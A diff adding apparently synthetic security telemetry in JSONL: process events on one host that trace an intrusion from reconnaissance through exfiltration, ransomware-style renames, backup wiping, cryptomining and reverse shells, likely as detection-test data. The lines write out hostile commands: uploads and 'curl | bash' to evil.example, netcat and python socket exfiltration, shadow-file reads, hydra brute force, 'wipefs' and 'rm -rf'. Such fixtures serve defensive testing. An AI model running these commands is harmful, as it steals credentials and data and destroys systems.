@@ -1,0 +1,36 @@
+{"@timestamp":"2026-06-21T09:00:00Z","host":"web-01","action":"exec","process":{"pid":5017,"ppid":1,"name":"whoami","executable":"/usr/bin/whoami","command_line":"whoami"}}
+{"@timestamp":"2026-06-21T09:00:01Z","host":"web-01","action":"exec","process":{"pid":5018,"ppid":1,"name":"uname","executable":"/usr/bin/uname","command_line":"uname -a"}}
+{"@timestamp":"2026-06-21T09:00:02Z","host":"web-01","action":"exec","process":{"pid":5019,"ppid":1,"name":"find","executable":"/usr/bin/find","command_line":"find / -perm -4000 -type f"}}
+{"@timestamp":"2026-06-21T09:00:03Z","host":"web-01","action":"exec","process":{"pid":5020,"ppid":1,"name":"cat","executable":"/usr/bin/cat","command_line":"cat /etc/passwd"}}
+{"@timestamp":"2026-06-21T09:00:04Z","host":"web-01","action":"exec","process":{"pid":5021,"ppid":1,"name":"arp","executable":"/usr/sbin/arp","command_line":"arp -a"}}
+{"@timestamp":"2026-06-21T09:00:05Z","host":"web-01","action":"exec","process":{"pid":5022,"ppid":1,"name":"netstat","executable":"/usr/bin/netstat","command_line":"netstat -tlnp"}}
+{"@timestamp":"2026-06-21T09:00:06Z","host":"web-01","action":"exec","process":{"pid":5023,"ppid":1,"name":"ps","executable":"/usr/bin/ps","command_line":"ps aux"}}
+{"@timestamp":"2026-06-21T09:00:07Z","host":"web-01","action":"exec","process":{"pid":5024,"ppid":1,"name":"nmap","executable":"/usr/bin/nmap","command_line":"nmap -sS 10.0.0.0/24"}}
+{"@timestamp":"2026-06-21T09:00:08Z","host":"web-01","action":"exec","process":{"pid":5025,"ppid":1,"name":"ssh","parent_name":"bash","executable":"/usr/bin/ssh","command_line":"ssh deploy@10.0.0.9"}}
+{"@timestamp":"2026-06-21T09:00:09Z","host":"web-01","action":"exec","process":{"pid":5026,"ppid":1,"name":"ssh","parent_name":"cron","executable":"/usr/bin/ssh","command_line":"ssh -o StrictHostKeyChecking=no root@10.0.0.9"}}
+{"@timestamp":"2026-06-21T09:00:10Z","host":"web-01","action":"exec","process":{"pid":5027,"ppid":1,"name":"scp","executable":"/usr/bin/scp","command_line":"scp payload.sh deploy@10.0.0.9:/tmp/"}}
+{"@timestamp":"2026-06-21T09:00:11Z","host":"web-01","action":"connect","process":{"pid":5028,"ppid":1,"name":"ssh"},"network":{"src_ip":"10.0.0.5","src_port":40001,"dst_ip":"10.0.0.9","dst_port":22}}
+{"@timestamp":"2026-06-21T09:00:12Z","host":"web-01","action":"exec","process":{"pid":5029,"ppid":1,"name":"tar","executable":"/usr/bin/tar","command_line":"tar czf /dev/shm/loot.tar.gz /etc /home"}}
+{"@timestamp":"2026-06-21T09:00:13Z","host":"web-01","action":"exec","process":{"pid":5030,"ppid":1,"name":"find","executable":"/usr/bin/find","command_line":"find /home -name id_rsa"}}
+{"@timestamp":"2026-06-21T09:00:14Z","host":"web-01","action":"exec","process":{"pid":5031,"ppid":1,"name":"cp","executable":"/usr/bin/cp","command_line":"cp secrets.db /tmp/.x"}}
+{"@timestamp":"2026-06-21T09:00:15Z","host":"web-01","action":"exec","process":{"pid":5032,"ppid":1,"name":"openssl","executable":"/usr/bin/openssl","command_line":"openssl enc -aes-256-cbc -in data -out data.enc"}}
+{"@timestamp":"2026-06-21T09:00:16Z","host":"web-01","action":"exec","process":{"pid":5033,"ppid":1,"name":"nc","executable":"/usr/bin/nc","command_line":"nc 10.0.0.9 4444 < /etc/passwd"}}
+{"@timestamp":"2026-06-21T09:00:17Z","host":"web-01","action":"exec","process":{"pid":5034,"ppid":1,"name":"curl","executable":"/usr/bin/curl","command_line":"curl -F file=@/tmp/loot https://transfer.sh/loot"}}
+{"@timestamp":"2026-06-21T09:00:18Z","host":"web-01","action":"exec","process":{"pid":5035,"ppid":1,"name":"curl","executable":"/usr/bin/curl","command_line":"curl -T /tmp/loot https://evil.example/upload"}}
+{"@timestamp":"2026-06-21T09:00:19Z","host":"web-01","action":"rename","process":{"pid":5036,"ppid":1,"name":"encryptor"},"file":{"path":"/home/u/report.docx","target":"/home/u/report.docx.locked"}}
+{"@timestamp":"2026-06-21T09:00:20Z","host":"web-01","action":"exec","process":{"pid":5037,"ppid":1,"name":"lvremove","executable":"/usr/sbin/lvremove","command_line":"lvremove -f /dev/vg0/backup"}}
+{"@timestamp":"2026-06-21T09:00:21Z","host":"web-01","action":"exec","process":{"pid":5038,"ppid":1,"name":"systemctl","executable":"/usr/bin/systemctl","command_line":"systemctl stop auditd"}}
+{"@timestamp":"2026-06-21T09:00:22Z","host":"web-01","action":"exec","process":{"pid":5039,"ppid":1,"name":"rm","executable":"/usr/bin/rm","command_line":"rm -rf /var/www"}}
+{"@timestamp":"2026-06-21T09:00:23Z","host":"web-01","action":"exec","process":{"pid":5040,"ppid":1,"name":"xmrig","executable":"/tmp/xmrig","command_line":"xmrig -o pool.minexmr.com:4444 --donate-level 1"}}
+{"@timestamp":"2026-06-21T09:00:24Z","host":"web-01","action":"exec","process":{"pid":5041,"ppid":1,"name":"shutdown","executable":"/usr/sbin/shutdown","command_line":"shutdown -h now"}}
+{"@timestamp":"2026-06-21T09:00:25Z","host":"web-01","action":"exec","process":{"pid":5042,"ppid":1,"name":"wipefs","executable":"/usr/sbin/wipefs","command_line":"wipefs -a /dev/sdb"}}
+{"@timestamp":"2026-06-21T09:00:26Z","host":"web-01","action":"exec","process":{"pid":5043,"ppid":1,"name":"bash","executable":"/usr/bin/bash","command_line":"curl http://evil.example/x.sh | bash"}}
+{"@timestamp":"2026-06-21T09:00:27Z","host":"web-01","action":"exec","process":{"pid":5044,"ppid":1,"name":"python3","executable":"/usr/bin/python3","command_line":"python3 -c import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.0.0.9,4444))"}}
+{"@timestamp":"2026-06-21T09:00:28Z","host":"web-01","action":"exec","process":{"pid":5045,"ppid":1,"name":"ssh","executable":"/usr/bin/ssh","command_line":"ssh -R 8080:localhost:80 user@evil.example"}}
+{"@timestamp":"2026-06-21T09:00:29Z","host":"web-01","action":"exec","process":{"pid":5046,"ppid":1,"name":"proxychains4","executable":"/usr/bin/proxychains4","command_line":"proxychains4 nmap 10.0.0.9"}}
+{"@timestamp":"2026-06-21T09:00:30Z","host":"web-01","action":"exec","process":{"pid":5047,"ppid":1,"name":"setenforce","executable":"/usr/sbin/setenforce","command_line":"setenforce 0"}}
+{"@timestamp":"2026-06-21T09:00:31Z","host":"web-01","action":"exec","process":{"pid":5048,"ppid":1,"name":"journalctl","executable":"/usr/bin/journalctl","command_line":"journalctl --vacuum-time=1s"}}
+{"@timestamp":"2026-06-21T09:00:32Z","host":"web-01","action":"exec","process":{"pid":5049,"ppid":1,"name":"bash","executable":"/usr/bin/bash","command_line":"echo aGVsbG8= | base64 -d | bash"}}
+{"@timestamp":"2026-06-21T09:00:33Z","host":"web-01","action":"exec","process":{"pid":5050,"ppid":1,"name":"cat","executable":"/usr/bin/cat","command_line":"cat /etc/shadow"}}
+{"@timestamp":"2026-06-21T09:00:34Z","host":"web-01","action":"exec","process":{"pid":5051,"ppid":1,"name":"hydra","executable":"/usr/bin/hydra","command_line":"hydra -l root -P rockyou.txt ssh://10.0.0.9"}}
+{"@timestamp":"2026-06-21T09:00:35Z","host":"web-01","action":"exec","process":{"pid":5052,"ppid":1,"name":"gcore","executable":"/usr/bin/gcore","command_line":"gcore -o /tmp/dump 1234"}}
